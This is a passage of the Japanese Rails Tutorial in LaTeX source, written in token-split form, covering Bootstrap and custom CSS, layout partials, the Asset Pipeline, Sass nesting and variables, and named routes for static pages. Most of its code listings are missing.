▁また 、\ ko de { s r c } 属性 には ▁" \ ko de { images } " ▁という ディレクトリ 名 が \ emph { 含 まれ ていない } ことに も 注目してください 。 これは \ ko de { assets } ディレクトリ 内の 他の ディレクトリ ▁( images や javascripts 、 stylesheets など ) ▁ も 同様 です 。
▁最後に 、\ ko de { alt } 属性 は 、 画像 がない 場合に 代わりに 表示される 文字列 です 。 たとえば 視 覚 障 害 のある ユーザーが 使用する ス ク リ ー ン リ ー ダ ー では 、 ここ の 属性 が 読み 上 げ られ て 、 そこ に 画像 がある ことが 示 されます 。
▁ HTML 標準 では 実際に 要求 されている にも 関 わ らず 、 画像 に \ ko de { alt } 属性を 付け ていない 手 抜 き の Web サイト を とき ど き 見 かけ ます 。
▁なお 、 今回は ▁( 先 頭 が 大文字 の ) ▁" Rails " と するために \ ko de { alt } テキスト を 明示的に 設定 しています 。
▁ いよいよ 、 ここ まで の 苦 労 の 成 果 を確認する 準備 が できました ▁( 図 \ ref { fig : layout _ no _ log o _ or _ custom _ css })。
▁ 思 って いた よりも み す ぼ ら しい でしょう か 。
▁ そう かもしれません 。
▁しかし 、 HTML 要素 に 実 用 的な クラス を与える という 良い 仕 事 が できた の も 確 か です 。 さらに 、 クラス を 与え た この 段 階 で 、 CSS を使用して サイトに スタイル を与える ことができ た のは 、 タ イ ミ ング として 非常に 適 切 である と思います 。
▁\ ref { sec : adding _ to _ the _ layout } では 、 多くの HTML 要素 に CSS クラス を 関連付け ました 。 こう しておくこと で 、 CSS ベース で レイアウト を構成する 際に 高 い 柔 軟 性 を与えて く れ ます 。
▁\ ref { sec : adding _ to _ the _ layout } で 述 べ た ように 、 これらの クラスの 多く は 、 Twitter が 作成した フレームワーク である \ href { http :// get bootstrap . com /}{ Bootstrap } 特 有 の ものです 。 Bootstrap を使用すると 、 洗 練 された Web デザイン と ユーザー インターフェイス 要素 を簡単に HTML 5 アプリケーション に追加 することができます 。
▁この節では 、 サンプルアプリケーション に スタイル を追加する ために 、 カスタム CSS ルール と Bootstrap を 組み合わせ て 使用します 。
▁ 注 目 すべき 点 は 、 Bootstrap を使う ことで アプリケーションを \ href { http :// en . w ikipedia . org / wiki / Re s p on s ive _ web _ de sign }{\ emph { レ シ ポ ン シ ブ デザイン } } に できる ということです 。 これにより 、 どの 端 末 で アプリケーションを 閲 覧 しても 、 ある程度 見 栄 え を よく することができます 。
▁最初に 、 リスト \ ref { code : bootstrap _ sass } で 示 している ように Bootstrap を追加しましょう 。 これは 、\ text tt { bootstrap - sass } ▁gem を使用して Rails アプリケーションに 導入 できます 。
▁ Bootstrap フレームワーク では 、 動的な スタイルシート を生成する ために \ href { http :// less css . org /}{ L E S S ▁ CSS } 言語 を使用しています が 、 Rails の Asset ▁Pipeline はデフォルトで は ▁( L E S S と 非常に よく 似 た ) ▁ Sass 言語 を サポート します ▁(\ ref { sec : sass _ and _ the _ asset _ pipeline })。 そのため 、\ text tt { bootstrap - sass } は 、 L E S S を Sass へ 変 換 し 、 必要な Bootstrap ファイルを 現在の アプリケーションで すべて 利用 できるようにします
▁ Asset ▁Pipeline では L ess を使う こともできます 。 詳 しく は \ href { http :// ruby gem s . org / gem s / less - rails - bootstrap }{\ text tt { less - rails - bootstrap } ▁gem } を参照してください 。
▁ いつものように \ ko de { bundle ▁install } を実行して 、 Bootstrap を インストール します 。
▁ ちなみに 、\ ko de { rails ▁ generate } コマンド を実行する ことで コントローラ ー ごとに 分 け られ た CSS ファイル が自動的に 生成されます が 、 これらの ファイルを 正しい 順序 で 読み 込 ま せる のは 至 難 の 技 なので 、 本チュートリアルで は ▁( 簡潔 のために ) ▁ すべての CSS を 1 つ に まとめ る 方 針 を 採 っています 。
▁ カスタム CSS を 動か す ための 最初の 一 歩 は 、 カスタム CSS ファイルを 作る ことです 。
▁app / assets / stylesheets / custom . css . s css
▁( ここでは \ ref { sec : g re en } ▁ の 途 中 で紹介した ▁\ ko de { to u ch } ▁ コマンド を使っています が 、 ファイルが 作成 できる なら ▁[ 新 規 ファイル 作成 ] ▁ や 他の コマンド でも 問題 ありません 。 )
▁この ディレクトリ 名 と ファイル名 は 、 どちら も 重要です 。
▁以下の ディレクトリ は 、
▁app / assets / stylesheets /
▁ Asset ▁Pipeline ▁(\ ref { sec : sass _ and _ the _ asset _ pipeline }) の一部 であり 、 この ディレクトリ に置かれ た スタイルシート は \ ko de { application . css } の一部 として 自動的に Web サイトの レイアウト に インクルード されます 。
▁さらに 、 ファイル名 の \ ko de { custom . css . s css } には \ ko de { . css } という 拡張子 も 含 まれ ている ので 、 この ファイルは CSS ファイル であること が 示 されています 。 また 、\ ko de { . s css } という 拡張子 も 含 まれ ている ので 、 ▁この ファイルは Sass を 記述 できる CSS ファイル ▁( Sass y ▁ CSS : ▁S css ) ▁ であること も 示 され ており 、 Asset ▁Pipeline は これを 見 て Sass を 処理 できるようにします
▁( Sass は \ ref { sec : sass } まで 登 場 しません が 、\ text tt { bootstrap - sass } ▁gem が 動作 するための お ま じ ない として 必要 です )。
▁ カスタム CSS 用の ファイル を作成し たら 、 リスト \ ref { code : bootstrap _ css } のように ▁\ ko de {@ im port } を使用して 、 Bootstrap ▁( と それ に 関連する Sprockets ) ▁ を インクルード します
▁ も し この ステップ が 摩訶 不 思 議 に 思 え たら 、 次のように 考えてみましょう 。 「 私 は ただ \ href { https :// github . com / t w b s / bootstrap - sass # bootstrap - for - sass - - - } { bootstrap - sass の README ファイル } に従って いる の だ 」 と 。
▁ Bootstrap ▁ CSS を追加する
▁リスト \ ref { code : bootstrap _ css } の 2 行 では 、 Bootstrap ▁ CSS の フレームワーク を導入し ています 。
▁ 導入 後 、 Web サーバ を 再 起動 させる と 、 アプリケーションに 反 映 させる ことができます ▁(\ ref { fig : sample _ app _ only _ bootstrap } で紹介した ように 、 Ctrl - C を 押 して Web サーバ を 停 止 させ た 後 、 ▁\ ko de { rails ▁ server } コマンド を 打 って Web サーバ を 起動 してください )。 うまく い け ば 図 \ ref { fig : sample _ app _ only _ bootstrap } のような 結果 に
▁ さ て 、 テキスト の 配置 は 今 ひとつ で 、 ロ ゴ には スタイル も ありません が 、 色 使い と signup ボタン は な か な か よい 感 じ になっ てきました 。
▁次に 、 リスト \ ref { code : un i ver s al _ css } に示したように 、 Web サイト 全体 に わ た って レイアウト と 個 別の ページに スタイル を与える ための CSS を追加します 。
▁ テスト の 結果を 図 \ ref { fig : sample _ app _ un i ver s al } に示します 。
▁ すべての ページ に適用 される 共通 の スタイル を CSS に追加する
▁ / * ▁ un i ver s al ▁* /
▁ スペース や 共通 スタイル を追加した 結果
▁リスト \ ref { code : un i ver s al _ css } の CSS の 形式 は 一 貫 しています 。
▁ CSS ルール では 一般に 、 クラス 、 id 、 HTML タグ 、 または それらの 組み合わせ 、 のいずれか を指定します 。 そして その後 ろ に ス タ イ リ ング コマンド の リスト を 記述 します 。
▁たとえば 、 以下のコード では 、
▁ ページ 上 部 に 6 0 ピ ク セ ル の 余 白 を追加します 。
▁\ ko de { header } タグ に \ ko de { n a v bar - fi x ed - to p } クラス が与えられ ている ので 、 これ に従って Bootstrap は ナビゲーション バー を ページ 上 部 に 固定 し 、 ナビゲーション バー の下に 余 白 を 置 いて 主 要 部分 から 分 離 します
▁( デフォルトの n a v bar の 色 が Bootstrap ▁2 . 0 から 変更 された ため 、 現在の 淡 色 の代わりに ダ ー ク な 色 調 に したい場合は \ ko de { n a v bar - inverse } クラス を使用する 必要があります )。
▁また 、 この ルール にある 以下の CSS は 、
▁\ ko de { center } クラス に \ ko de { text - al ig n : ▁ center } プロ パ テ ィ を 関連付け ています 。
▁ 言 い 換 え ると 、\ ko de { . center } 冒 頭 の ドット \ ko de { . } は 、 この ルール が クラス に対して スタイル を 適 用 すること を 示 しています 。
▁ この場合 、\ ko de { center } クラス に 属 している ▁(\ ko de { div } などの ) ▁ タグ の 内 側 にある 要素 は 、 すべて ページ 中 で セ ン タ リ ング される ことを 意味 しています
▁( この クラス の例 は リスト \ ref { code : signup _ button } で 参 照 できます )。
▁ Bootstrap には 洗 練 された タ イ ポ グ ラ フ ィ ー を 利用できる CSS ルール があります が 、 ここでは さらに 、 リスト \ ref { code : t y p o gra ph y _ css } に示したように サイトの テキスト の 外 観 を 変え る カスタム CSS ルール を追加しましょう 。
▁( これらの ルール は Home ページ で すべて 適 用 される とは 限 り ません が 、 サンプルアプリケーションの 他の 場所 でも 使用される もの もあります )。
▁リスト \ ref { code : t y p o gra ph y _ css } を 反 映 した 結果を 図 \ ref { fig : sample _ app _ t y p o gra ph y } で 確認 することができます 。
▁ 洗 練 された タ イ ポ グ ラ フ ィ ー を 利用 するための CSS を追加する
▁ / * ▁t y p o gra ph y ▁* /
▁ タ イ ポ グ ラ フ ィ ー スタイル を追加する
▁最後に 、 いくつかの ルール を サイト ロ ゴ に追加します 。 この サイト ロ ゴ は 「 sample ▁app 」 だけ が表示されている シンプルな ものです 。
▁リスト \ ref { code : log o _ css } の CSS は 、 テキスト を 大文字 に変換 し 、 サイズ 、 色 、 配置 を変更 します
▁( サイト ロ ゴ が ページ で 一度 しか 使用 され ない ことを前提とし て CSS ▁id を使用しています が 、 代わりに クラス を使用する こともできます )。
▁ サイト ロ ゴ に CSS を追加する
▁ / * ▁ header ▁* /
▁ HTML の 色 は 、 16 進 数 ▁( 基 数 が 16 ) ▁ の 3 つの 数値 の 組み合わせ で 表現 され 、 赤 、 緑 、 青 の 三 原 色 に ▁( この 順序 で ) ▁ コード 化 することができます 。
▁ 以下のコード は 、
▁リスト \ ref { code : log o _ css } の CSS の 結果 は 図 \ ref { fig : sample _ app _ log o } で 確認 できます 。
▁ デザイン された ロ ゴ と サンプル アプリ
▁リスト \ ref { code : layout _ new _ structure } の レイアウト は その 目的 を 果 た しています が 、 少々 散 ら か っています 。
▁ HTML ▁ sh im は 、 それ だけで 3 行 も 占 有 し 、 風 変 わ り な I E 特 有 の 文法 を 使用している ので 、 これを うまく 隠 す ことができ たら どんな に よいでしょう 。
▁また 、 HTML ヘッダー は 論 理 的な 単 位 を 形 成 する ため 、 一 箇所 に まとめ る 必要 もあります 。
▁Rails では 、\ emph { パーシャル ▁( partial ) } ▁ と呼ばれる 機能 を使用して これを 実現 することができます 。
▁最初に 、 パーシャル を定義する と レイアウト が どのように 変わる か を見てみましょう ▁( リスト \ ref { code : layout _ with _ partial s })。
▁ レイアウト に sh im と header の パーシャル を追加する
▁リスト \ ref { code : layout _ with _ partial s } では 、 以下のように \ ko de { render } と呼ばれる Rails ヘルパー 呼び出し だけ を使って 、 HTML ▁ sh im の スタイルシート 行 を 置 換 しています 。
▁ 多くの Rails 開発者 は 、 異なる ビュー の 間 で 共通 に 使用する パーシャル を保存する ディレクトリ として 、\ ko de { shared } ディレクトリ を使用します 。
▁ 著者 は 、 複数の ビューで 共有 する ユ ー テ ィ リ テ ィ パーシャル については \ ko de { shared } フォルダ に保存 し 、 文字 ど お り 全 ページ ▁( サイト レイアウト の一部 として ) ▁ 共通 の パーシャル については \ ko de { layouts } ディレクトリ へ 保存 すること を 好 んで います
▁(\ ko de { shared } ディレクトリ は 第 \ ref { cha : sign _ up } 章 で 作成 します )。
▁ 著者 はこの ように 分割 保存 する の が 論 理 的 である と 考え ます が 、\ ko de { shared } フォルダ に すべて 保存 しても 問題 なく 動作します 。
▁もちろん 、 パーシャル が 動作する ためには 、 それ に対応する ファイル と コンテンツ を 記述 し なければなりません 。
▁この sh im パーシャル の場合は 、 リスト \ ref { code : layout _ new _ structure } の わずか 3 行 の sh im コード だけです 。
▁作成した コードをリスト \ ref { code : stylesheets _ partial } に示します
▁ HTML ▁ sh im 用の パーシャル
▁ 同様に 、 他の ヘッダー の 情報 も リスト \ ref { code : header _ partial } の パーシャル に移動し 、\ ko de { render } を 呼び出し て レイアウト に 挿 入 することができます 。
▁( パーシャル では 、 自動生成 せずに 、 テキストエディタ を使って 手動で 作成する の が 一般的 です 。 )
▁ header 用の パーシャル
▁これで パーシャル の作成 方法 が わかり ました ので 、 今度は ヘッダー に対応する フ ッ タ を 同じ 方法で 追加 しましょう 。
▁\ ko de { footer } タグ と \ ko de { . footer } クラス を 両方 使用している こと について 疑 問 に 思 う 方が いる かもしれません 。
▁その 理由 は 、 footer タグ と する 方が 読み 手 にとって 意味 が 明 確 である の と 、 . footer クラス は Bootstrap で使用する ためです 。
▁\ ko de { footer } を \ ko de { div } に置き換え ても 動作 は 変 わ り ません 。
▁ footer 用の パーシャル
▁< s m all >
▁ Michael ▁Hartl ▁( マ イ ケ ル ハ ート ル )
▁</ s m all >
▁</ footer >
▁ About
▁ Contact
▁(\ ko de { header } タグ と同様 、\ ko de { footer } タグ も HTML 5 で 新 た に追加 された 要素 です )。
▁ フ ッ タ パーシャル は 、 スタイルシート や ヘッダー パーシャル のとき と同じ 方法で レイアウト 中 に追加 できます ▁( リスト \ ref { code : layout _ with _ footer })。
▁ レイアウト に footer パーシャル を追加する
▁ そのまま 実際に フ ッ ター を表示し てみると どう にも 見 苦 しい ので 、 リスト \ ref { code : footer _ css } で スタイル を 若 干 追加 しましょう 。
▁ スタイル を追加した 結果を 図 \ ref { fig : site _ with _ footer } に示します 。
▁ サイトに footer 用 CSS を追加する
▁ / * ▁ footer ▁* /
▁ Home ページに footer を追加する
▁ 最 近 の Rails に追加 された 機能 の中で 最も 特 筆 すべき 機能 の ひとつ は 、 CSS 、 JavaScript 、 画像 などの 静 的 コンテンツ の 生 産 性 と 管理 を 大 幅 に 強 化 する 「\ emph { Asset ▁Pipeline }」 です 。
▁この節では 、 Asset ▁Pipeline の概要 と 、 素晴らしい CSS 生成 ツール である 「\ emph { Sass }」 の 使い 方 について説明し ます 。
▁ Asset ▁Pipeline は 、 Rails の 流 儀 を 守 り ながら 多 大 な 変 化 を も たら します が 、 一般的な Rails 開発者 の 視 点 から は 、 アセット ディレクトリ 、 マニフェストファイル 、 プ リ プロ セ ッ サ エンジン という 、 3 つの 主要な 機能 が 理解 の 対象 となります
▁この チュートリアル 構成 は 、 Michael ▁ E r as m us による 素晴らしい ブログ 記事 「 5 分 で わ か る Rails ▁3 の Asset ▁Pipeline ▁( 英語 )」 を も と に しています 。
▁詳細については Rails ガイド の 「\ href { http :// guides . rubyonrails . org / asset _ pipeline . html } { アセットパイプライン }」 の 項 を参照してください 。
▁ では 、 それぞれ を 順に 見 て い き ましょう 。
▁ アセット ディレクトリ
▁Rails ▁ 3.0 以前の バージョン では 、 静 的 ファイルは \ ko de { public / } 以下の 次の ディレクトリ に置かれ ていました 。
▁これらの ディレクトリ 中 の ファイルは ▁ http :// example . com / stylesheets ▁ のような リクエスト によって自動的に 配信 されます 。 これは 3.0 以降 も 同様 です 。
▁Rails 3.1 以降 では 、 静 的 ファイルを 目的 別 に 分 類 する 、 標準的な \ emph { 3 つの } ディレクトリ が 使用される ようになりました 。 最新の Rails でも 同様 です 。
▁\ ko de { app / assets } : ▁ 現在の アプリケーション 固有の アセット
▁\ ko de { lib / assets } : ▁ あなた の 開発 チ ー ム によって 作成された ライブラリ 用の アセット
▁\ ko de { vendor / assets } : ▁ サ ー ド パ ー テ ィ の アセット
▁これらの ディレクトリ には 、 それぞれの アセット クラス 用の サブディレクトリ があります 。 たとえば 、 app / assets には 次のような サブディレクトリ があります 。
▁ マニフェストファイル
▁ アセット を 上 記 の 論 理 的な 場所 へ 配置 すれば 、\ emph { マニフェストファイル } を使用して 、 それら を どのように 1 つの ファイルに まとめ る のか を Rails に 指示 することができます 。 なお 、 実際に まとめ る のは \ href { https :// github . com / s st e ph en s on / s pro c ke t s } { Sprockets } ▁gem が 行います 。
▁( マニフェストファイル は CSS と JavaScript には 適 用 されます が 、 画像 ファイル には 適 用 されません ) ▁ 。
▁1 つの 例 として 、 アプリケーション スタイルシート 用の マニフェストファイル を見てみましょう ▁( リスト \ ref { code : app _ css _ ma n if e st })。
▁ アプリケーション 固有の CSS 用 マニフェストファイル
▁ Y o u ' re ▁ free ▁to ▁ add
▁< n > ▁* = ▁require _ tree ▁ .
▁< n > ▁* = ▁require _ self
▁上の 行 で 重要な 部分 は 実は CSS コメント の中に あります 。 以下の行 は 、 適切な ファイルを インクルード するために Sprockets によって 使用されます 。
▁< n > ▁* = ▁require _ tree ▁ .
▁\ ko de { app / assets / stylesheets } ディレクトリ ▁( サブディレクトリ を含む ) ▁ 中 の すべての CSS ファイルが 、 アプリケーション CSS に含まれる ようにします 。 次の 行
▁< n > ▁* = ▁require _ self
▁ CSS の 読み込み シ ー ケ ン ス の中で 、\ ko de { application . css } 自身 も インクルード すること を指定して います 。
▁Rails には 実 用 的な デフォルトの マニフェストファイル が 付 属 している ので 、\ emph { Rails チュートリアル } では 変更 を加え る 必要 が ありません が 、 も し 必要な 場合は 、 Rails ガイド の 「\ href { http :// guides . rubyonrails . org / asset _ pipeline . html } { アセットパイプライン }」 で 詳 細 な 情報 を参照 できます 。
▁ プ リ プロ セ ッ サ エンジン
▁ 必要な アセット を ディレクトリ に 配置 して まとめ た 後 、 Rails は さまざまな プ リ プロ セ ッ サ エンジン を 介 して それら を実行し 、 ブラウザ に 配信 できるように それら を マニフェストファイル を 用 いて 結合 し 、 サイト テンプレート 用 に 準備 します 。
▁Rails は 、 どの プ リ プロ セ ッ サ を使用する か を 、 ファイル名 の 拡張子 を使用して 判 断 します 。 最も 一般的な 拡張子 は 、 Sass 用の \ ko de { . s css } 、 CoffeeScript 用の \ ko de { . coffee } 、 埋め込み Ruby ▁( ER b ) ▁ 用の \ ko de { . erb } です 。
▁\ ref { sec : layouts _ and _ e m b ed de d _ ruby } では 最初に ER b を 、\ ref { sec : sass } では Sass を それぞれ 扱 い ました 。
▁なお 本書 では 扱 いません が 、 CoffeeScript は エ レ ガ ン ト で 簡潔 な 言語 で 、 JavaScript に コンパイル して 実行 します
▁( 興 味 のある 方は 、 RailsCast の 「\ href { http :// rails casts . com / e p is odes / 2 6 7 - coffee script - basic s } { CoffeeScript の基礎 } ▁( 英語 )」 から 始 め ると 良い でしょう )。
▁ プ リ プロ セ ッ サ エンジン は つ な げ て 実行 する ▁( cha in ) ▁ ことができます 。
▁上の 拡張子 の場合 、 CoffeeScript プロ セ ッ サ 経由で 実行されます 。
▁上の 拡張子 の場合は 、 CoffeeScript と ER b の 両方 で 実行されます ▁( コードは 右 から 左 へ と 実行されます ので 、 この 例 では CoffeeScript が 最初に 実行されます )。
▁ 本番環境で の 効率 性
▁ Asset ▁Pipeline の 最大 の メ リ ッ ト の 1 つ は 、 本番 の アプリケーションで 効率 的に な るように 最適化 された アセット も 自動的に 生成される ことです 。
▁ 従来 は 、 CSS と JavaScript を 整 理 するために 、 機能を 個 別の ファイルに 分割 し 、 ( インデント を 多 用 して ) ▁ 読み やすい フォーマット に 整 え ていました 。
▁これは 、 プ ログ ラ マ にとって は 便利な 方法 ですが 、 本番環境 にとって は 非 効率 です 。
▁ それ という の も 、 最小化 されていない CSS や JavaScript ファイルを 多 数 インクルード すると 、 ページの 読み込み 時間 が 著 しく 遅 くなる からです ▁( 読み込み 時間 は 、 ユーザー 体 験 の 質 に 影 響 を与える 重要な 指 標 の 1 つ です )。
▁ Asset ▁Pipeline を使うと 、 この 「 開発 効率 と 読み込み 時間 の どちら を 重 視 するか 」 という 問題 について 悩 む 必要 が なくなります 。 開発環境 では プ ログ ラ マ にとって 読み やすい ように 整 理 しておき 、 本番環境で は Asset ▁Pipeline を使って ファイルを 最小化 すれば よい のです 。
▁ 具体的には 、 Asset ▁Pipeline が すべての スタイルシート を 1 つの CSS ファイル ▁(\ ko de { application . css }) ▁ に まとめ 、 すべての JavaScript ファイルを 1 つの J S ファイル ▁(\ ko de { javascripts . js }) ▁ に まとめ て く れ ます 。 さらに 、 それらの ファイル すべて に対して ▁ 不要な 空白 や インデント を 取り 除 く 処理 を行い 、 ファイル サイズ を \ emph { 最小化 } してくれます 。
▁ 結果 として 、 開発環境 と 本番環境 という 、 2 つの 異 な った 状 況 に対して それぞれ 最 高 の 環境 を 提 供 してくれます 。
▁< n >< n > ▁% ▁subsection ▁the _ asset _ pipeline ▁( end )< n >< n > ▁\ subsection { 素晴らしい 構 文 を 備 え た スタイルシート } ▁% ▁( fold )< n > ▁\ label { sec : sass }< n >< n >
▁\ emph { Sass } ▁ は 、 スタイルシート を 記述 するための 言語 であり 、 CSS に 比 べ て 多くの 点が 強 化 されています 。
▁この節では 、 Sass が提供する 2 つの 重要な 機能 、\ emph { ネスト } と \ emph { 変数 } について説明し ます 。
▁( 3 つ目の 重要な 機能 である \ emph { ミ ッ ク ス イン } については 、\ ref { sec : rails _ environments } で 紹 介 します )。
▁ このため 、 有効な CSS ファイルは 、 すべて S CSS ファイル として も 扱 う ことができ 、 既存の 記 法 ルール を 使用している プロジェクト にとって も 互 換 性 のある 便利な フォーマット になっています 。
▁ 本書 の例 では 、 Bootstrap の 恩 恵 を得る ために 、 私 達 は 最 初 から S CSS を使用しています 。
▁Rails の Asset ▁Pipeline は 、\ ko de { . s css } という 拡張子 を持つ ファイルを Sass を使って 自動的に 処理 してくれます 。 このため 、\ ko de { custom . css . s css } ファイルは Sass プ リ プロ セ ッ サ によって 前 処理 され 、 その後 ブラウザ への 配信 に 備 え て パ ッ ケ ー ジ 化 されます 。
▁ スタイルシート 内に 共通 の パターン がある場合 は 、 要素 を ネスト させる ことができます 。
▁たとえば 、 リスト \ ref { code : un i ver s al _ css } では 、 以下のように \ ko de { . center } と \ ko de { . center ▁ h 1 } の 両方 に対して ルール があります 。
▁上の ルール は 、 Sass を使用して 以下のように 書き 換 え ることができます 。
▁上の 例 では 、 ネスト の 内 側 にある \ ko de { h 1 } という ルール は 、\ ko de { . center } の ルール を継承し ています 。
▁今度は 、 もう少し 異なる ルール に対して ネスト 機能 を使う 例 を見てみましょう 。
▁リスト \ ref { code : log o _ css } には 以下のコード があります 。
▁これらの ネスト 機能 は 、 フ ッ ター の CSS でも 使用できます 。 リスト \ ref { code : footer _ css } のコードは 、 S CSS を使用して 以下のように 書き 換 え ることができます 。
▁リスト \ ref { code : footer _ css } を 手 作業 で 変 換 してみる ことは 、 良い 演習 になります 。 変 換 後に も CSS が 適切に 動作 している ことを確認 してみましょう 。
▁ Sass では 、 冗 長 な コード を削除し 、 より 自 由 な 表現 を 可能 に するために 、\ emph { 変数 } が 定義 できる ようになっています 。
▁たとえば 、 リスト \ ref { code : t y p o gra ph y _ css } や リスト \ ref { code : footer _ css } を見 てみると 、 同じ 色 を 繰り返し 参 照 している 箇所 があります 。
▁この 機能 を使用して 、 S CSS を 以下のように 書き 直 す ことができます 。
▁ 実際 、 Bootstrap フレームワーク では 、 多くの 色 に対して 変数 名を 定義 しています 。 定義されている 変数 は Bootstrap ページの 「\ href { http :// get bootstrap . com / custom ize / # less - variable s } { L E S S 変数 一覧 }」 で 参 照 することができます 。
▁この Web サイト では 、 Sass ではなく L E S S を使って 変数 が 定義 されています が 、\ text tt { bootstrap - sass } という gem を使用すれば 、 Sass でも 同様 の 変数 が 使えるようになります 。
▁ 話 を 戻 して 、 Bootstrap の 変数 の 一覧 表 を見ると 、 薄 い 灰 色 に対して 以下の 変数 名 が与えられ ること に 気 が 付き ます 。
▁これは つまり 、
▁ 今回 取り上げ た Sass の ネスト 機能 や 変数 機能 を使って S CSS ファイルを 全 面 的に 書き 直 す と 、 リスト \ ref { code : re factor ed _ s css } のようになります 。
▁\ ko de { footer } タグ の ルール が 、 劇 的に 向 上 している ことを確認 してみてください 。
▁ ネスト や 変数 を使って 初期 の S CSS ファイルを 書き 直 した 結果
▁ / * ▁ m i x in s , ▁ variable s , ▁ e t c . ▁* /
▁ Sass を使って スタイルシート を より 簡単に する方法 は 他にも あります が 、 今回は その 中 でも 最も 重要な 機能 を使って リスト \ ref { code : re factor ed _ s css } を 書き 直 しました 。 Sass を使う こと によって 、 素晴らしい ス ター ト を 切 ること が できました 。
▁S e e ▁the ▁\ href { http :// sass - lang . com /}{ Sass ▁ web site } ▁for ▁more ▁ de t a il s .
▁もちろん 、 以下のように リンク を直接 記述 することもできます 。
▁しかし 、 上の 記 法 は Rails 流 ではありません 。
▁ / about
▁さらに 、 Rails では 以下のような コード では \ emph { 名前付きルート } を使用する の が 慣 例 と な っています 。
▁上の ように することで コードの 意味 が わかりやすく なり 、\ ko de { about \_ path } の 定義 を 変え れば \ ko de { about \_ path } が 使用されている すべての URL を変更 できる ため 、 柔 軟 性 が 高 まり ます 。
▁ 今後 使用する 計 画 のある すべての リンク の リスト を 、 URL と ルート ▁( route ) ▁ の マッピング と 共 に 表 \ ref { table : url _ m app ing } に示します 。
▁\ ref { sec : set t ing _ the _ root _ route } で 最初の ルート は 設定 済み ですが 、 それ以外の ルート について も同様に 実装 していきます 。 なお 、 login については 本 章 の最後 で 少し だけ 実装します
▁( 第 \ ref { cha : log _ in _ log _ out } 章 で 本 格 的に 実装します )。
▁ / help
▁ / contact
▁ / signup
▁ / login
▁ サイト リンク の ルート ▁( routing ) ▁ と URL の マッピング
▁\ label { table : url _ m app ing } }< n >\ end { table }< n >< n >\ subsection { Contact ページ } ▁% ▁( fold )< n >\ label { sec : contact _ page }< n >< n >
▁まずは 、 第 \ ref { cha : static _ pages } 章 の 演習 で 取り上げ た Contact ページ について 追加 しましょう 。
▁ Contact ページの テストを リスト \ ref { code : contact _ page _ test } に示します 。 これは 単 に リスト \ ref { code : title _ tests } で 使用されている テスト の パターン に 従 った ものです 。
▁ Contact ページ のテスト
▁" Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁A p p "
▁< n >< n > ▁test ▁" sh o ul d ▁get ▁ help " ▁do < n > ▁get ▁: help < n > ▁ assert _ response ▁: success < n > ▁ assert _ select ▁" title ", ▁" Help
▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁A p p
▁ アプリケーション コードは 、\ ref { sec : getting _ started _ with _ testing } の About ページ への 追加 と 良 く 似 ています 。 最初に ルート ▁( リスト \ ref { code : contact _ route }) ▁ を更新し ます 。 次に \ ko de { contact } アクション を StaticPages コントローラ ▁( リスト \ ref { code : contact _ action }) ▁ に追加します 。 最後に Contact ビュー ▁( リスト \ ref { code : contact _ view }) ▁ を作成します 。
▁ Contact ページの ルート を追加する ▁( ▁\ failing ▁ )
▁ Contact ページ 用の アクション を追加する ▁( ▁\ failing ▁ )
▁ Contact ページの ビュー を追加する ▁( ▁\ passing ▁ )
▁ここで 、 すべての テストが ▁\ passing ▁ である ことを確認 して おいてください 。
▁< n >\ end { code }< n >\ end { code list ing }< n >< n > ▁% ▁subsection ▁ route _ tests ▁( end )< n >< n > ▁\ subsection { Rails の ルート } ▁% ▁( fold )< n > ▁\ label { sec : rails _ routes }< n >< n > To ▁ add ▁the ▁name d ▁ routes ▁for ▁the ▁ sample ▁app ' s ▁ static ▁ pages , ▁we ' ll ▁ edit ▁the ▁ routes ▁ file , ▁\ ko de { config / \ - routes . rb } , ▁that ▁Rails ▁use s ▁to ▁def in e ▁ URL ▁ m app ing s .
▁まずは 、\ ref { sec : set t ing _ the _ root _ route } で定義した Home ページの ルーティング について 見 直 して い き ましょう 。 あ のとき は 特 別 に Home ページ のみ 設定 を しました が 、 残 り の 静的ページ について も同様に ルーティング を 設定 していきます 。
▁ 私 た ち は これまで に 、 ルート URL を定義する コードを 3 回 見 てきました 。 1 つ 目 は
▁という Hello アプリケーションの コード ▁( リスト \ ref { code : hello _ root _ route }) です 。 2 つ 目 は
▁という To y アプリケーションの コード ▁( リスト \ ref { code : rails _ routes _ root _ route })。 そして 最 後 は
▁という Sample アプリケーションの コード です ▁( リスト \ ref { code : home _ root _ route })。
▁ いずれ の場合 において も 、\ ko de { root } メソッドを使って ルート URL ▁" / " ▁ を コントローラ ー の アクションに 紐 付け ていました 。
▁ ルート URL のような ルーティング を定義する こと の 効果 は 、 ブラウザから アクセス し や す く すること だけ ではありません 。 それ 以外に も 、 生 の URL ではなく 名前付きルート を使って URL を参照 すること が できるようになります 。 w h i ch ▁is ▁to ▁create ▁name d ▁ routes ▁that ▁ allow ▁ us ▁to ▁ ref er ▁to ▁ routes ▁ by ▁a ▁name ▁ r at her ▁ th an ▁ by ▁the ▁ raw ▁ URL . ▁ In ▁this ▁ case , ▁the s e ▁ routes ▁are ▁\ ko de { root \_ path } ▁and ▁\ ko de { root \_ url } , ▁with ▁the ▁ only ▁ difference ▁be ing ▁that ▁the ▁ la tt er ▁ include s ▁the ▁ full ▁ URL :
▁なお 、\ emph { Rails チュートリアル } では 、\ ko de { \_ path } 書 式 を使用する 一般的な 規 約 に従い 、 リダイレクト の場合 のみ \ ko de { \_ url } 書 式 を使用します 。
▁これは 、 HTTP 標準 では 技術 的に リダイレクト 後に 完全な URL が 要求 される ためです 。 ただし 、 ほとんど の ブラウザで は どちら の 方法 でも 動作します 。
▁ Help ページ や About ページ 、 Contact ページ などの 名前付きルート を定義し たい場合は 、\ ko de { get } ルール を使って 定義 することができます ▁( リスト \ ref { code : contact _ route })。 たとえば 次のような ルール は 、
▁また 、 ルート URL のとき と同様に 、\ ko de { help \_ path } や \ ko de { help \_ url } といった 名前付きルート も 使えるようになります 。
▁ 他の 静的ページ について も同様に ルーティング を変更 して い く と 、 リスト \ ref { code : contact _ route } は リスト \ ref { code : static _ page _ routes } のような コード になります 。
▁ 静的なページ の ルーティング 一覧
▁リスト \ ref { code : static _ page _ routes } で ルート を定義し た ことにより 、 レイアウト の中で 名前付きルート が 使えるように なりました 。
▁ 早 速 、\ ko de { link \_ to } メソッドの 2 番目の 引数 で 、 適切な 名前付きルート を使って みましょう 。
▁たとえば 以下のコード の場合 、
▁ 他 も 同様 です 。
▁ ヘッダー パーシャル では 、 Web 共通 の 慣習 に従って 、 ロ ゴ にも Home ページ へのリンク を追加します 。
